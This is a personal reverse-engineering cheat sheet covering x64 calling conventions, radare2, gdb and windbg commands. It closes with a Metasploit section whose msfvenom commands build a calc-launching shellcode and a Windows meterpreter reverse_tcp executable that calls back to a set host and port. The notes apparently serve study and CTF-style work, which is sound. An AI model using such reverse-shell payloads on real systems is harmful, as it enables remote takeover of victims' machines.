

# 调用规约

- Linux x64：
  * TLDR: rdi, rsi, rdx, rcx, r8, r9
  * User-level applications use as integer registers for passing the sequence %rdi, %rsi, %rdx, %rcx, %r8 and %r9. The kernel interface uses %rdi, %rsi, %rdx, %r10, %r8 and %r9. [link](https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-and-user-space-f)

- Windows x64:
  * rcx, rdx, r8, r9, then stack
  * https://docs.microsoft.com/zh-cn/cpp/build/x64-calling-convention?view=vs-2019

```c++
func1(int a, int b, int c, int d, int e, int f);
// a in RCX, b in RDX, c in R8, d in R9, f then e pushed on stack
```
- Windows x86:
  - esp+4, esp+8

# r2 (radare2)

- `aaaa` 分析
- `afl` 列出函数
  * `afl~main` 列出包含 main 的函数
- `s main` 切换(seek)当前地址为 main
- `pdf` 打印当前的汇编
- 任意命令加 `?` 提供 help 信息，比如 `pd?`


# gdb

- r 运行，run
- c 继续，continue
- info reg 查看寄存器
- br *main 在main函数下断点
- br src/ss.c:123 在文件 ss.c:123 处下断点
- del 1 删除断点1
- diable 1 禁用断点1
- enable 1 启用断点1
- info br 查看断点
- x/4gx 0xdeadbeef 检查内存
  * x/4wx 控制每行的列数
  * x/2wx $rax 
- x/10i $pc 打印当前汇编
  * x/10i $rip rip/eip/pc都可以
  * x/-10i $rip 可以倒着来
- n(next) 源码级别step over
- s(step) 源码级别step in
- si(stepi) 汇编级别step in
- ni(nexti) 汇编级别step over
- starti 开始时断下（找不到入口/entry时）


* [gdb和lldb的对比](https://lldb.llvm.org/use/map.html)
* [gdb online docs](https://sourceware.org/gdb/onlinedocs/gdb/)


# windbg
- `sxe ld:xx.dll` dll加载时断下
- `* blabla` 注释
- `u $exentry` 查看入口/entry
- `x ntdll!D*` 查看符号
- `p` step over
- `t` (trace) step into


## more to learn
- https://medium.com/@yardenshafir2/windbg-the-fun-way-part-1-2e4978791f9b new way
- https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2020/07/27/debugging_malwarewi-hk5u.html log
- https://github.com/hugsy/defcon_27_windbg_workshop/blob/master/windbg_cheatsheet.md must memorize


# msf

shellcode

```sh
msfvenom -p windows/x64/exec CMD=calc.exe   -a x64 --platform win -f raw -o calc64.raw

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.0.11 LPORT=1111 -f exe > shell.exe

# 常用payload
payload/windows/x64/meterpreter_bind_tcp

```

